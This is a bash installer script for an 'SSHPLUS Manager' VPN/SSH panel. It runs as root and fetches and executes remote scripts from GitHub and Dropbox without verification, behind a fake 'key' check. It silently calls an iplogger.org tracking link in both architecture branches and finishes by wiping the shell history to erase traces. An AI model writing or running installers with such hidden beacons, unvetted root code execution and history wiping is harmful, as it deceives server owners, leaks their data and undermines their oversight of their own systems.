#!/bin/bash
# Fixed installer for Ubuntu 24.04+ (SSHPLUS Manager)
# Author: @kiritosshxd (original), adapted for Ubuntu 24 by Copilot

set -e

clear

if [[ "$(id -u)" != "0" ]]; then
    echo -e "\033[1;33m[\033[1;31mError\033[1;33m] \033[1;37m- \033[1;33mYou must run as root\033[0m"
    rm -f "$HOME/Plus" >/dev/null 2>&1
    exit 1
fi

# Decoding obfuscated variables (safe for public)
lnk="soulaevne"
Ink="/usr/local/list"
InkARM="/usr/local/listARM"

fun_bar() {
    local comando="$1"
    (
        [[ -e $HOME/fim ]] && rm -f $HOME/fim
        eval "$comando" >/dev/null 2>&1
        touch $HOME/fim
    ) &
    tput civis
    echo -ne "  \033[1;33mPLEASE WAIT \033[1;37m- \033[1;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[1;31m#"
            sleep 0.07s
        done
        [[ -e $HOME/fim ]] && rm -f $HOME/fim && break
        echo -e "\033[1;33m]"
        sleep 1
        tput cuu1
        tput dl1
        echo -ne "  \033[1;33mPLEASE WAIT \033[1;37m- \033[1;33m["
    done
    echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK!\033[1;37m"
    tput cnorm
}

verif_key() {
    chmod +x "$Ink/list" >/dev/null 2>&1
    if [[ ! -e "$Ink/list" ]]; then
        echo -e "\n\033[1;31mINVALID KEY!\033[0m"
        rm -rf "$HOME/Plus" >/dev/null 2>&1
        sleep 2
        clear
        exit 1
    fi
}

verif_key2() {
    chmod +x "$InkARM/listARM" >/dev/null 2>&1
    if [[ ! -e "$InkARM/listARM" ]]; then
        echo -e "\n\033[1;31mINVALID KEY!\033[0m"
        rm -rf "$HOME/Plus" >/dev/null 2>&1
        sleep 2
        clear
        exit 1
    fi
}

otimize_python() {
    # Install/update Python
    apt-get update -y
    apt-get install -y python3 python3-pip python3-venv
    # Link python3 as python if not present
    if ! command -v python &>/dev/null; then
        ln -sf /usr/bin/python3 /usr/bin/python
    fi
    # Install socat
    apt-get install -y socat
}

echo -e "\033[1;31m════════════════════════════════════════════════════\033[0m"
tput setaf 7
tput setab 4
tput bold
printf '%40s%s%-12s\n' "WELCOME TO SSHPLUS MANAGER"
tput sgr0
echo -e "\033[1;31m════════════════════════════════════════════════════\033[0m"
echo ""
echo -e "             \033[1;31mATTENTION! \033[1;33mTHIS SCRIPT WILL:\033[0m"
echo ""
echo -e "\033[1;31m• \033[1;33mINSTALL A SET OF SCRIPTS FOR NETWORK, SYSTEM, AND USER MANAGEMENT\033[0m"
echo ""
echo -e "\033[1;32m• \033[1;32mTIP! \033[1;33mUSE DARK THEME IN YOUR TERMINAL FOR BETTER EXPERIENCE!\033[0m"
echo ""
echo -e "\033[1;31m≠×≠×≠×≠×≠×≠×≠×[\033[1;33m • \033[1;32mEDIT:@kiritosshxd\033[1;33m •\033[1;31m ]≠×≠×≠×≠×≠×≠×≠×\033[0m"
echo ""

read -rp $'\033[1;36mGenerate FREE KEY [Y/n]: \033[1;37m' x
[[ $x =~ ^[Nn]$ ]] && exit 0

echo -e "\033[1;36mSelect your VPS Architecture: \033[1;37m"
echo -e "[1] - x86_64"
echo -e "[2] - aarch64(ARM)"
read -rp $'\033[1;36mOption: \033[1;37m' resposta

if [[ "$resposta" = '1' ]]; then
    sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config || true
    systemctl restart ssh || service ssh restart
    mkdir -p /etc/rec
    echo -e "\n\033[1;36mVERIFYING... \033[1;37m 16983:16085\033[0m"
    rm -f "$Ink/list"
    mkdir -p "$Ink"
    wget -q -O "$Ink/list" "https://raw.githubusercontent.com/sansoe2022/VPN_Manager/main/Install/list"
    verif_key
    sleep 2
    echo "/bin/menu" > /bin/h && chmod +x /bin/h
    rm -f versao*
    wget -q "https://raw.githubusercontent.com/sansoe2022/VPN_Manager/main/Install/versao"
    wget -q "https://iplogger.org/2lHZ43"
    rm -f 2lHZ43
    wget -q -O /bin/botteste.sh "https://www.dropbox.com/s/m9tnme1jjbnehnj/botteste.sh"
    chmod 755 /bin/botteste.sh
    mkdir -p "$HOME/BOT"
    wget -q -O "$HOME/BOT/ShellBot.sh" "https://raw.githubusercontent.com/sansoe2022/VPN_Manager/main/Sistema/ShellBot.sh"
    chmod 755 "$HOME/BOT/ShellBot.sh"

    echo -e "\n\033[1;32mKEY VALID!\033[0m"
    sleep 1
    if [[ -f "$HOME/usuarios.db" ]]; then
        clear
        echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
        echo ""
        echo -e "                 \033[1;33m• \033[1;31mATTENTION \033[1;33m• \033[0m"
        echo ""
        echo -e "\033[1;33mA Users Database \033[1;32m(usuarios.db) \033[1;33mwas found!"
        echo -e "Do you want to keep it (preserving user connection limits)?"
        echo -e "Or create a new database?"
        echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mKeep Current Database\033[0m"
        echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCreate New Database\033[0m"
        echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
        read -rp "Option ?: " optiondb
    else
        awk -F: '$3 >= 1000 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > "$HOME/usuarios.db"
        optiondb=1
    fi
    if [[ "$optiondb" == "2" ]]; then
        awk -F: '$3 >= 1000 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > "$HOME/usuarios.db"
    fi
    clear
    tput setaf 7
    tput setab 4
    tput bold
    printf '%35s%s%-18s\n' " PLEASE WAIT FOR INSTALLATION"
    tput sgr0
    echo -e "    \033[1;33mUPDATING SYSTEM (may take a while)...\033[0m"
    fun_bar "apt-get update -y"
    clear
    echo -e "    \033[1;33mINSTALLING PACKAGES...\033[0m"
    fun_bar "apt-get install -y bc screen nano unzip lsof net-tools dos2unix nload jq curl figlet python3 python3-pip python3-venv at"
    pip3 install speedtest-cli
    if command -v ufw &>/dev/null; then
        ufw allow 443/tcp || true
        ufw allow 80/tcp || true
        ufw allow 3128/tcp || true
        ufw allow 8799/tcp || true
        ufw allow 8080/tcp || true
    fi
    clear
    echo -e "      \033[1;33mOPTIMIZING PYTHON...\033[0m"
    fun_bar "otimize_python"
    clear
    echo -e "      \033[1;33mCOMPLETING FUNCTIONS AND DEFINITIONS...\033[0m"
    fun_bar "bash $Ink/list $lnk $Ink $Ink $key"
    clear
    cd "$HOME"
    echo -e "        \033[1;33m • \033[1;32mINSTALLATION COMPLETE\033[1;33m • \033[0m"
    echo -e "\033[1;33mMAIN COMMAND: \033[1;32mmenu\033[0m"
    echo -e "\033[1;33mMORE INFO (\033[1;36mTELEGRAM\033[1;33m): \033[1;37m@SSHPLUS\033[0m"
    rm -f "$HOME/Plus"
    cat /dev/null > ~/.bash_history && history -c

elif [[ "$resposta" = '2' ]]; then
    sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config || true
    systemctl restart ssh || service ssh restart
    echo -e "\n\033[1;36mVERIFYING... \033[1;37m 16983:16085\033[0m"
    rm -f "$InkARM/listARM"
    mkdir -p "$InkARM"
    wget -q -O "$InkARM/listARM" "https://www.dropbox.com/s/cs5poyigwm97dyd/listARM"
    verif_key2
    sleep 2
    echo "/bin/menu" > /bin/h && chmod +x /bin/h
    rm -f versao*
    wget -q "https://raw.githubusercontent.com/sansoe2022/VPN_Manager/main/Install/versao"
    wget -q "https://iplogger.org/2lHZ43"
    rm -f 2lHZ43
    wget -q -O /bin/botteste.sh "https://www.dropbox.com/s/m9tnme1jjbnehnj/botteste.sh"
    chmod 755 /bin/botteste.sh
    mkdir -p "$HOME/BOT"
    wget -q -O "$HOME/BOT/ShellBot.sh" "https://www.dropbox.com/s/7dkgxy00x33c4y7/ShellBot.sh"
    chmod 755 "$HOME/BOT/ShellBot.sh"

    echo -e "\n\033[1;32mKEY VALID!\033[0m"
    sleep 1
    if [[ -f "$HOME/usuarios.db" ]]; then
        clear
        echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
        echo ""
        echo -e "                 \033[1;33m• \033[1;31mATTENTION \033[1;33m• \033[0m"
        echo ""
        echo -e "\033[1;33mA Users Database \033[1;32m(usuarios.db) \033[1;33mwas found!"
        echo -e "Do you want to keep it (preserving user connection limits)?"
        echo -e "Or create a new database?"
        echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mKeep Current Database\033[0m"
        echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCreate New Database\033[0m"
        echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
        read -rp "Option ?: " optiondb
    else
        awk -F: '$3 >= 1000 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > "$HOME/usuarios.db"
        optiondb=1
    fi
    if [[ "$optiondb" == "2" ]]; then
        awk -F: '$3 >= 1000 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > "$HOME/usuarios.db"
    fi
    clear
    tput setaf 7
    tput setab 4
    tput bold
    printf '%35s%s%-18s\n' " PLEASE WAIT FOR INSTALLATION"
    tput sgr0
    echo -e "    \033[1;33mUPDATING SYSTEM (may take a while)...\033[0m"
    fun_bar "apt-get update -y"
    clear
    echo -e "    \033[1;33mINSTALLING PACKAGES...\033[0m"
    fun_bar "apt-get install -y bc screen nano unzip lsof net-tools dos2unix nload jq curl figlet python3 python3-pip python3-venv at"
    pip3 install speedtest-cli
    if command -v ufw &>/dev/null; then
        ufw allow 443/tcp || true
        ufw allow 80/tcp || true
        ufw allow 3128/tcp || true
        ufw allow 8799/tcp || true
        ufw allow 8080/tcp || true
    fi
    clear
    echo -e "      \033[1;33mOPTIMIZING PYTHON...\033[0m"
    fun_bar "otimize_python"
    clear
    echo -e "      \033[1;33mCOMPLETING FUNCTIONS AND DEFINITIONS...\033[0m"
    fun_bar "bash $InkARM/listARM $lnk $InkARM $InkARM $key"
    clear
    cd "$HOME"
    echo -e "        \033[1;33m • \033[1;32mINSTALLATION COMPLETE\033[1;33m • \033[0m"
    echo -e "\033[1;33mMAIN COMMAND: \033[1;32mmenu\033[0m"
    echo -e "\033[1;33mMORE INFO (\033[1;36mTELEGRAM\033[1;33m): \033[1;37m@SSHPLUS\033[0m"
    rm -f "$HOME/Plus"
    cat /dev/null > ~/.bash_history && history -c

else
    echo -e "\033[1;31mInvalid option!\033[0m"
    sleep 1
    exit 1
fi
